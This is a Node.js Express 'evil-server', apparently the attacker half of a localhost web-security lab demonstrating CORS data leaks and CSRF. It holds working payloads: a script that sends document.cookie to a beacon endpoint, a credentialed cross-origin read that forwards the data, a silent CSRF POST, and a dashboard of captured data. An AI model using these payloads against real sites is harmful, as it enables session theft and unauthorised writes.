const express = require('express');

const PORT = 5000;
const HOST = '127.0.0.1';
const API_ORIGIN = 'http://localhost:4001';

const app = express();
app.use(express.json());

let captured = [];

function log(type, source, details) {
  captured.push({ time: new Date().toISOString(), type, source, details });
}

function page(title, bodyHtml) {
  return (
    '<!doctype html><html><head><meta charset="utf-8"><title>' +
    title +
    '</title></head><body>' +
    bodyHtml +
    '</body></html>'
  );
}

app.get('/', (req, res) => {
  res.type('html').send(
    page(
      'evil-server',
      '<h1>evil-server</h1>' +
        '<ul>' +
        '<li><a href="/steal">CORS data-leak demo</a></li>' +
        '<li><a href="/csrf">CSRF write demo</a></li>' +
        '<li><a href="/captured">View captured data</a></li>' +
        '</ul>'
    )
  );
});

app.get('/steal', (req, res) => {
  res.type('html').send(
    page(
      'evil-server: CORS steal',
      '<h1>Stealing data from api-server...</h1>' +
        '<pre id="out">(waiting...)</pre>' +
        '<script>' +
        "fetch('" +
        API_ORIGIN +
        "/list', { credentials: 'include' })" +
        '.then(function (r) { return r.json(); })' +
        '.then(function (data) {' +
        "  document.getElementById('out').textContent = JSON.stringify(data, null, 2);" +
        "  return fetch('/capture', {" +
        "    method: 'POST'," +
        "    headers: { 'Content-Type': 'application/json' }," +
        "    body: JSON.stringify({ type: 'cors-read', details: JSON.stringify(data) })" +
        '  });' +
        '})' +
        '.catch(function (err) {' +
        "  document.getElementById('out').textContent = 'blocked: ' + err.message;" +
        '});' +
        '</script>'
    )
  );
});

app.get('/csrf', (req, res) => {
  res.type('html').send(
    page(
      'evil-server: CSRF',
      '<h1>Silently posting to api-server...</h1>' +
        '<pre id="out">(sending...)</pre>' +
        '<script>' +
        "fetch('" +
        API_ORIGIN +
        "/list', {" +
        "  method: 'POST'," +
        "  credentials: 'include'," +
        "  headers: { 'Content-Type': 'text/plain' }," +
        "  body: 'csrf-planted-message ' + new Date().toISOString()" +
        '})' +
        '.then(function () {' +
        "  document.getElementById('out').textContent = 'request sent, response was readable (unexpected at this stage)';" +
        '})' +
        '.catch(function () {' +
        "  document.getElementById('out').textContent = 'request sent, response unreadable (expected — check the message board to see if the write went through anyway)';" +
        '})' +
        '.finally(function () {' +
        "  return fetch('/capture', {" +
        "    method: 'POST'," +
        "    headers: { 'Content-Type': 'application/json' }," +
        "    body: JSON.stringify({ type: 'csrf-post', details: 'attempted POST /list on api-server' })" +
        '  });' +
        '});' +
        '</script>'
    )
  );
});

app.get('/evil.js', (req, res) => {
  res.type('application/javascript').send(
    "new Image().src = 'http://" +
      HOST +
      ':' +
      PORT +
      "/beacon.png?c=' + encodeURIComponent(document.cookie);"
  );
});

app.get('/beacon.png', (req, res) => {
  const cookieValue = req.query.c || '';
  log('beacon-hit', req.ip, 'captured cookie: "' + cookieValue + '"');
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==', 'base64');
  res.type('image/gif').send(pixel);
});

app.post('/capture', (req, res) => {
  const { type, details } = req.body || {};
  log(type || 'unknown', req.ip, details || '');
  res.json({ ok: true });
});

app.get('/captured-data', (req, res) => {
  res.json({ ok: true, captured });
});

app.get('/captured', (req, res) => {
  res.type('html').send(
    page(
      'evil-server: captured',
      '<h1>Captured data</h1>' +
        '<button id="reset" type="button">Reset</button>' +
        '<table id="table" border="1" cellpadding="4">' +
        '<thead><tr><th>Time</th><th>Type</th><th>Source</th><th>Details</th></tr></thead>' +
        '<tbody></tbody>' +
        '</table>' +
        '<script>' +
        'async function refresh() {' +
        "  const res = await fetch('/captured-data');" +
        '  const data = await res.json();' +
        "  const tbody = document.querySelector('#table tbody');" +
        "  tbody.innerHTML = '';" +
        '  for (const row of data.captured) {' +
        "    const tr = document.createElement('tr');" +
        '    for (const field of [row.time, row.type, row.source, row.details]) {' +
        "      const td = document.createElement('td');" +
        '      td.textContent = field;' +
        '      tr.appendChild(td);' +
        '    }' +
        '    tbody.appendChild(tr);' +
        '  }' +
        '}' +
        "document.getElementById('reset').addEventListener('click', async function () {" +
        "  await fetch('/reset', { method: 'POST' });" +
        '  refresh();' +
        '});' +
        'refresh();' +
        'setInterval(refresh, 2000);' +
        '</script>'
    )
  );
});

app.post('/reset', (req, res) => {
  captured = [];
  res.json({ ok: true });
});

app.listen(PORT, HOST, () => {
  console.log('evil-server listening on http://' + HOST + ':' + PORT);
});
